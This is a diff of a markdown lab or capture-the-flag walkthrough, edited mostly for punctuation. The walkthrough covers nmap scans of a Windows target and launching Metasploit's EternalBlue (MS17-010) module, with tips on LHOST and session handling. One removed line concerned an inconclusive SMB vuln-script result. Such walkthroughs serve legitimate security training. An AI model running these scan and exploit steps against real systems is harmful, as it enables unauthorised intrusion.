@@ -38,7 +38,7 @@ Category: **Exploitation**, with a secondary phase of **Post-Exploitation / Cred
 nmap -p- --min-rate 5000 -Pn TARGET_IP
 ```
 
-Version-scan only the distinct services. The 49152+ block is the dynamic RPC range already represented by port 135. scanning it adds minutes and tells you nothing.
+Version-scan only the distinct services. The 49152+ block is the dynamic RPC range already represented by port 135. Scanning it adds minutes and tells you nothing.
 
 ```
 nmap -A -Pn -p 135,139,445,3389,5985,47001 TARGET_IP
@@ -53,8 +53,6 @@ nmap -A -Pn -p 135,139,445,3389,5985,47001 TARGET_IP
 ```
 nmap -Pn -p 445 --script vuln TARGET_IP
 ```
-
-`smb-vuln-ms10-061` returning `ERROR` is inconclusive, not clean — report it as untested.
 
 <!-- PAGE BREAK -->
 <div style="page-break-after: always;"></div>
@@ -84,7 +82,7 @@ use exploit/windows/smb/ms17_010_eternalblue
 show options
 ```
 
-Use the full path rather than `use 0` — index numbers shift between module database versions.
+Use the full path rather than `use 0` - index numbers shift between module database versions.
 
 The auto-populated `LHOST` is a local virtualisation adapter address, not your VPN address. Left unchanged, the exploit reports success and no session ever appears.
 
@@ -129,7 +127,7 @@ Runs on the target, not the attack box. The command echoes twice — normal for 
 Ctrl+Z
 ```
 
-Prompts `Background session ... ? [y/N]` — enter **y**. Returns to the `msf` prompt; the session stays alive.
+Prompts `Background session ... ? [y/N]` then enter **y**. Returns to the `msf` prompt; the session stays alive.
 
 <!-- PAGE BREAK -->
 <div style="page-break-after: always;"></div>
